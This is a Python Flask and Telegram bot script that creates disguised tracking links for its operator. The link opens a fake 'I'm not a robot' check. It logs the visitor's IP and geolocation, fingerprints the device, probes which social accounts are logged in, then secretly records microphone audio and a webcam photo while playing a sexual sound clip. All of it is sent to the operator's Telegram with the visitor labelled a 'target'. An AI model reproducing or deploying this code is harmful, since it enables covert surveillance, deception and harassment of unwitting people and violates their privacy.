import telebot, requests, os, uuid
from flask import Flask, request, send_from_directory

# Настройки
API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)
db = {}

# Название твоего файла в корне GitHub
SOUND_FILE = 'zvuki-seksa-seks-na-beregu_-zhenskie-stony-pod-shum-morya.mp3'

@app.route('/ston.mp3')
def send_ston():
    return send_from_directory(os.getcwd(), SOUND_FILE)

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
        <h1 style="margin-bottom:20px;">🛡️ CVERIA CORE V12</h1>
        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;">АКТИВИРОВАТЬ СИСТЕМУ</a>
    </body>
    '''

@app.route('/activate')
def activate():
    webhook_url = f"https://{request.host}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return f"✅ SYSTEM ARMED: {webhook_url}"
    return "❌ ERROR"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "!", 200
    return "forbidden", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "URL EXPIRED", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g = f"🌍 {r['country']}, {r['city']}\n📡 {r['isp']}\n🛡️ VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}"
    except: pass
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <audio id="snd" src="/ston.mp3" preload="auto"></audio>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.innerText = "Анализ...";
            try {{ document.getElementById('snd').play(); }} catch(e) {{}}
            
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A", gpu: "N/A", bench: 0 }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", hist: history.length, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language }},
                social: {{ g: "❌", vk: "❌", tg: "❌" }},
                inc: "НЕТ", mot: "static"
            }};

            const t0 = performance.now();
            for(let i=0; i<10000000; i++) {{ Math.sqrt(i); }}
            d.hw.bench = Math.round(performance.now() - t0) + "ms";

            try {{
                let gl = document.createElement('canvas').getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            const ck = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r("✅"); i.onerror=()=>r("❌"); i.src=u; }});
            d.social.g = await ck("https://accounts.google.com");
            d.social.vk = await ck("https://vk.com");
            d.social.tg = await ck("https://web.telegram.org");

            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "(Заряжается)" : "(Нет)";
            }} catch(e) {{}}

            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.inc = "ДА";
            }}
            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.mot = "moving"; }};

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                function rec() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); f.append('uid', "{uid}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) rec();
                    }};
                    r.start(); setTimeout(() => r.stop(), 10000);
                }}
                rec();
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{ 
                            setTimeout(() => {{ window.location.href = "{target}"; }}, 2000);
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ ID:* `{d['uid']}`\n\n"
             f"🔋 *Заряд:* {d['bat']['lvl']} {d['bat']['char']}\n"
             f"🌐 *Сеть:* {d['net']['type']} | *Вкладки:* {d['net']['hist']}\n"
             f"🧠 *CPU:* {d['hw']['cores']} ядер | *RAM:* {d['hw']['ram']}GB\n"
             f"🚀 *Benchmark:* {d['hw']['bench']}\n"
             f"📺 *Экран:* {d['hw']['scr']}\n"
             f"🎮 *GPU:* {d['hw']['gpu']}\n"
             f"👤 *Вход:* Google: {d['social']['g']} | VK: {d['social']['vk']} | TG: {d['social']['tg']}\n"
             f"🕵️ *Инкогнито:* {d['inc']}\n"
             f"🏃 *Движение:* {d['mot']}\n"
             f"🕒 *Пояс:* {d['net']['tz']} | {d['net']['lang']}")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f: bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ЛИЦО ТАРГЕТА* (ID: `{uid}`)")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *РЕАКЦИЯ* (ID: `{uid}`)")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🤖 Бот-логгер CVERIA активен. Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ Ссылка: https://{request.host}/v/{uid}")
